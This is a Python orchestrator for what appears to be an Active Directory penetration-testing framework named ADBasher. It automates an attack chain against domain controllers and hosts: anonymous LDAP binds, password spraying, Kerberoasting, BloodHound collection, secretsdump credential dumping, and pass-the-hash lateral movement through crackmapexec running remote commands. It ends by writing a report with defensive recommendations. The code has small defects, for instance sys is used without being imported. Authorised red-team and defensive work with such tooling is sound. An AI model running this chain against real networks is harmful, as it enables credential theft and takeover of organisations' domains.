import os
import uuid
import yaml
import time
from datetime import datetime
from rich.console import Console
from rich.progress import Progress

from core.logger import setup_logger, get_logger
from core.database import DatabaseManager, Target, Credential

console = Console()

class Orchestrator:
    def __init__(self, args):
        self.args = args
        self.session_id = str(uuid.uuid4())[:8]
        self.config = self._load_config()
        self.logger = None
        self.db = None
        self.session_dir = ""

    def _load_config(self):
        # Load default config
        config_path = os.path.join(os.path.dirname(__file__), 'config.yaml')
        with open(config_path, 'r') as f:
            config = yaml.safe_load(f)
        return config

    def initialize_session(self):
        """Sets up the session directory, database, and logging."""
        base_dir = os.path.expanduser(self.config['global']['session_dir'])
        self.session_dir = os.path.join(base_dir, self.session_id)
        os.makedirs(self.session_dir, exist_ok=True)

        # Setup Logging
        setup_logger(
            self.session_id, 
            self.session_dir, 
            level=self.config['global']['log_level']
        )
        self.logger = get_logger("Orchestrator")
        self.logger.info(f"Session initialized: {self.session_id}")
        self.logger.info(f"Session Directory: {self.session_dir}")

        # Setup Database
        db_path = os.path.join(self.session_dir, "session.db")
        self.db = DatabaseManager(db_path)
        self.logger.info("Database initialized")

        # Initial Target Scoping
        if self.args.target:
            self.logger.info(f"Adding initial targets: {self.args.target}")
            # Simplified target adding logic for now
            for target in self.args.target:
                self.db.add_target(ip=target)

    def run(self):
        """Main execution loop."""
        try:
            console.print(f"[bold green]Starting ADBasher Session: {self.session_id}[/bold green]")
            self.initialize_session()

            # Define phases to run
            phases = [
                ("Reconnaissance", self.run_recon),
                ("Vulnerability Analysis", self.run_vuln_analysis),
                ("Credential Attacks", self.run_cred_attacks),
                ("Lateral Movement", self.run_lateral_movement),
                ("Reporting", self.run_reporting)
            ]

            with Progress() as progress:
                task = progress.add_task("[cyan]Executing Attack Chain...", total=len(phases))
                
                for phase_name, phase_func in phases:
                    if not progress.finished:
                        progress.update(task, description=f"[cyan]Running Phase: {phase_name}")
                        self.logger.info(f"Starting Phase: {phase_name}")
                        
                        try:
                            phase_func()
                            self.logger.info(f"Completed Phase: {phase_name}")
                        except Exception as e:
                            self.logger.error(f"Error in {phase_name}: {str(e)}", exc_info=True)
                            console.print(f"[bold red]Error in {phase_name}: {e}[/bold red]")
                            # Decide whether to continue based on config? For now, continue.
                        
                        progress.advance(task)

            console.print(f"[bold green]Session Completed. Check report in {self.session_dir}[/bold green]")

        except KeyboardInterrupt:
            console.print("[yellow]Session interrupted by user.[/yellow]")
            if self.logger: self.logger.warning("Session interrupted by user")

    # --- Phase Placeholders ---
    # These will call specific modules in future steps

    def run_recon(self):
        """
        Phase 1: Reconnaissance
        Executes:
        - discover_domain.py
        - ADnetscan.sh (Wrapper) - TODO
        """
        self.logger.info("Starting Reconnaissance Phase")
        target_domains = self.config['scope'].get('target_domains', [])
        
        # Merge CLI targets if they look like domains
        if self.args.target:
            for t in self.args.target:
                if not t.replace('.','').isdigit() and '.' in t:
                    if t not in target_domains:
                        target_domains.append(t)
        
        # 1. Domain Discovery
        script_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '1 nocreds', 'discover_domain.py')
        
        for domain in target_domains:
            self.logger.info(f"Launching discover_domain.py for {domain}")
            console.print(f"[cyan]  -> Scanning Domain: {domain}[/cyan]")
            
            import subprocess
            
            # Prepare Environment (PYTHONPATH)
            env = os.environ.copy()
            env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")

            cmd = [
                sys.executable,
                script_path,
                "--session-dir", self.session_dir,
                "--domain", domain
            ]
            
            try:
                subprocess.run(cmd, env=env, check=True)
            except subprocess.CalledProcessError as e:
                self.logger.error(f"discover_domain.py failed for {domain}: {e}")
                console.print(f"[red]Failed to scan domain {domain}[/red]")

        # 2. LDAP Anonymous Bind
        # We need to query the DB for the DCs we just found
        session = self.db.get_session()
        dcs = session.query(self.db.Target).filter_by(is_dc=True).all()
        session.close() # Close immediately, let modules handle their own connections
        
        ldap_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '1 nocreds', 'ldap_anonymous_bind.py')
        
        for dc in dcs:
            self.logger.info(f"Launching ldap_anonymous_bind.py for {dc.ip_address}")
            console.print(f"[cyan]  -> Checking LDAP Anonymous: {dc.ip_address}[/cyan]")
            
            cmd = [
                sys.executable,
                ldap_script,
                "--session-dir", self.session_dir,
                "--target-ip", dc.ip_address
            ]
            
            try:
                subprocess.run(cmd, env=env, check=True) # Reuse env from above
            except subprocess.CalledProcessError as e:
                self.logger.warning(f"ldap_anonymous_bind failed for {dc.ip_address} (might just be closed)")

        # 3. ADnetscan.sh Wrapper (Future)


    def run_vuln_analysis(self):
        """
        Phase 2: Post-Exploitation Enumeration
        Executes:
        - BloodHound collection (if valid creds)
        - Secretsdump (if admin creds)
        """
        self.logger.info("Starting Post-Exploitation Enumeration Phase")
        
        # Check for valid credentials
        session = self.db.get_session()
        valid_cred = session.query(Credential).filter_by(is_valid=True).first()
        dcs = session.query(Target).filter_by(is_dc=True).all()
        session.close()
        
        if not valid_cred:
            self.logger.warning("No valid credentials found. Skipping post-exploitation.")
            return
        
        if not dcs:
            self.logger.warning("No DCs found. Skipping post-exploitation.")
            return
        
        # 1. BloodHound Collection
        bh_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'bloodhound_collect.py')
        
        for dc in dcs:
            if dc.domain and valid_cred.password:
                self.logger.info(f"Launching BloodHound collection for {dc.domain}")
                console.print(f"[cyan]  -> BloodHound: {dc.domain}[/cyan]")
                
                cmd = [
                    sys.executable,
                    bh_script,
                    "--session-dir", self.session_dir,
                    "--domain", dc.domain,
                    "--dc-ip", dc.ip_address,
                    "--username", valid_cred.username,
                    "--password", valid_cred.password
                ]
                
                try:
                    env = os.environ.copy()
                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
                    subprocess.run(cmd, env=env, check=True)
                except subprocess.CalledProcessError as e:
                    self.logger.error(f"BloodHound collection failed: {e}")
        
        # 2. Secretsdump (only if admin creds available)
        session = self.db.get_session()
        admin_cred = session.query(Credential).filter_by(is_admin=True).first()
        session.close()
        
        if admin_cred:
            sd_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'secretsdump_auto.py')
            
            for dc in dcs:
                self.logger.info(f"Launching secretsdump against {dc.ip_address}")
                console.print(f"[cyan]  -> Secretsdump: {dc.ip_address}[/cyan]")
                
                cmd = [
                    sys.executable,
                    sd_script,
                    "--session-dir", self.session_dir,
                    "--target-ip", dc.ip_address,
                    "--domain", dc.domain if dc.domain else "WORKGROUP",
                    "--username", admin_cred.username
                ]
                
                if admin_cred.password:
                    cmd.extend(["--password", admin_cred.password])
                elif admin_cred.ntlm_hash:
                    cmd.extend(["--ntlm-hash", admin_cred.ntlm_hash])
                
                try:
                    env = os.environ.copy()
                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
                    subprocess.run(cmd, env=env, check=True)
                except subprocess.CalledProcessError as e:
                    self.logger.error(f"Secretsdump failed: {e}")
        else:
            self.logger.info("No admin credentials yet. Skipping secretsdump.")

    def run_cred_attacks(self):
        """
        Phase 3: Credential Attacks
        Executes:
        - Password Spraying
        - Kerberoasting (if valid creds exist)
        """
        self.logger.info("Starting Credential Attack Phase")
        
        # Get DCs and domain info from DB
        session = self.db.get_session()
        dcs = session.query(Target).filter_by(is_dc=True).all()
        session.close()
        
        if not dcs:
            self.logger.warning("No DCs found. Skipping credential attacks.")
            return
        
        # 1. Password Spray
        spray_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '3 nopass/automated', 'password_spray.py')
        
        for dc in dcs:
            if dc.domain:
                self.logger.info(f"Launching password spray against {dc.domain}")
                console.print(f"[cyan]  -> Password Spray: {dc.domain}[/cyan]")
                
                cmd = [
                    sys.executable,
                    spray_script,
                    "--session-dir", self.session_dir,
                    "--domain", dc.domain,
                    "--dc-ip", dc.ip_address
                ]
                
                try:
                    env = os.environ.copy()
                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
                    subprocess.run(cmd, env=env, check=True)
                except subprocess.CalledProcessError as e:
                    self.logger.error(f"Password spray failed: {e}")
        
        # 2. Kerberoasting (only if we have valid creds)
        session = self.db.get_session()
        valid_creds = session.query(Credential).filter_by(is_valid=True).first()
        session.close()
        
        if valid_creds:
            kerb_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '3 nopass/automated', 'kerberoast.py')
            
            for dc in dcs:
                if dc.domain:
                    self.logger.info(f"Launching Kerberoast against {dc.domain}")
                    console.print(f"[cyan]  -> Kerberoast: {dc.domain}[/cyan]")
                    
                    cmd = [
                        sys.executable,
                        kerb_script,
                        "--session-dir", self.session_dir,
                        "--domain", dc.domain,
                        "--dc-ip", dc.ip_address
                    ]
                    
                    try:
                        env = os.environ.copy()
                        env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
                        subprocess.run(cmd, env=env, check=True)
                    except subprocess.CalledProcessError as e:
                        self.logger.error(f"Kerberoast failed: {e}")
        else:
            self.logger.info("No valid credentials yet. Skipping Kerberoast.")
        
        # 3. Check for Admin Privileges (Credential Cascading)
        self.logger.info("Checking discovered credentials for admin privileges...")
        admin_check_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'check_admin.py')
        
        for dc in dcs:
            if dc.domain:
                console.print(f"[cyan]  -> Checking Admin Privs: {dc.domain}[/cyan]")
                
                cmd = [
                    sys.executable,
                    admin_check_script,
                    "--session-dir", self.session_dir,
                    "--domain", dc.domain,
                    "--dc-ip", dc.ip_address
                ]
                
                try:
                    env = os.environ.copy()
                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
                    subprocess.run(cmd, env=env, check=True)
                except subprocess.CalledProcessError as e:
                    self.logger.warning(f"Admin check failed: {e}")
        
        # 4. Credential Cascading: If we found new admin creds, trigger post-exploitation again
        session = self.db.get_session()
        admin_cred = session.query(Credential).filter_by(is_admin=True).first()
        session.close()
        
        if admin_cred:
            self.logger.info("Admin credentials discovered! Re-running post-exploitation...")
            console.print("[bold green]Admin credentials found! Triggering advanced enumeration...[/bold green]")
            self.run_vuln_analysis()  # Recursive call for cascading

    def run_lateral_movement(self):
        """
        Phase 5: Lateral Movement
        Executes:
        - Pass-the-Hash attacks
        - Command execution on discovered hosts
        """
        self.logger.info("Starting Lateral Movement Phase")
        
        # Get all hosts and admin credentials
        session = self.db.get_session()
        admin_creds = session.query(Credential).filter_by(is_admin=True).all()
        targets = session.query(Target).filter_by(is_alive=True).all()
        session.close()
        
        if not admin_creds:
            self.logger.warning("No admin credentials for lateral movement")
            return
        
        if not targets:
            self.logger.warning("No targets for lateral movement")
            return
        
        self.logger.info(f"Attempting lateral movement to {len(targets)} hosts with {len(admin_creds)} admin creds")
        
        # Simple credential spraying across all hosts
        for cred in admin_creds:
            for target in targets:
                console.print(f"[cyan]  -> PTH: {cred.username} @ {target.ip_address}[/cyan]")
                
                cmd = ["crackmapexec", "smb", target.ip_address, 
                       "-u", cred.username, "-d", cred.domain if cred.domain else ""]
                
                if cred.password:
                    cmd.extend(["-p", cred.password])
                elif cred.ntlm_hash:
                    cmd.extend(["-H", cred.ntlm_hash])
                else:
                    continue
                
                # Add command execution
                cmd.extend(["-x", "whoami"])
                
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    if "(Pwn3d!)" in result.stdout:
                        self.logger.info(f"[SUCCESS] Lateral movement to {target.ip_address}")
                        # Store in LateralMovement table (TODO)
                except Exception as e:
                    self.logger.debug(f"Failed: {e}")

    def run_reporting(self):
        """Generate comprehensive penetration test report."""
        report_path = os.path.join(self.session_dir, "report.md")
        
        # Query database for results
        session = self.db.get_session()
        targets = session.query(Target).all()
        credentials = session.query(Credential).all()
        session.close()
        
        with open(report_path, "w") as f:
            f.write(f"# ADBasher Penetration Test Report\n")
            f.write(f"**Session ID:** {self.session_id}\n\n")
            f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("## Executive Summary\n")
            f.write(f"- **Targets Discovered:** {len(targets)}\n")
            f.write(f"- **Credentials Compromised:** {len(credentials)}\n")
            admin_count = sum(1 for c in credentials if c.is_admin)
            f.write(f"- **Admin Credentials:** {admin_count}\n\n")
            
            f.write("## Discovered Targets\n")
            f.write("| IP Address | Hostname | Domain | Type |\n")
            f.write("|------------|----------|--------|------|\n")
            for t in targets:
                dc_flag = "DC" if t.is_dc else "Host"
                f.write(f"| {t.ip_address} | {t.hostname or 'N/A'} | {t.domain or 'N/A'} | {dc_flag} |\n")
            f.write("\n")
            
            f.write("## Compromised Credentials\n")
            f.write("| Username | Domain | Type | Source | Admin |\n")
            f.write("|----------|--------|------|--------|-------|\n")
            for c in credentials:
                cred_type = "Password" if c.password else "NTLM Hash"
                admin_flag = "✓" if c.is_admin else "✗"
                f.write(f"| {c.username} | {c.domain or 'N/A'} | {cred_type} | {c.source} | {admin_flag} |\n")
            f.write("\n")
            
            f.write("## Recommendations\n")
            f.write("1. **Password Policy:** Enforce complex passwords and MFA\n")
            f.write("2. **Kerberoasting:** Disable or rotate service account passwords\n")
            f.write("3. **SMB Signing:** Enable SMB signing on all hosts\n")
            f.write("4. **LDAP Anonymous:** Disable anonymous LDAP binds\n\n")
            
            f.write("## Artifacts\n")
            f.write(f"- Session logs: `{self.session_dir}/session_*.log`\n")
            f.write(f"- BloodHound data: `{self.session_dir}/bloodhound_data/`\n")
            f.write(f"- Database: `{self.session_dir}/session.db`\n")
        
        self.logger.info(f"Report generated at {report_path}")
        console.print(f"[bold green]Report saved: {report_path}[/bold green]")
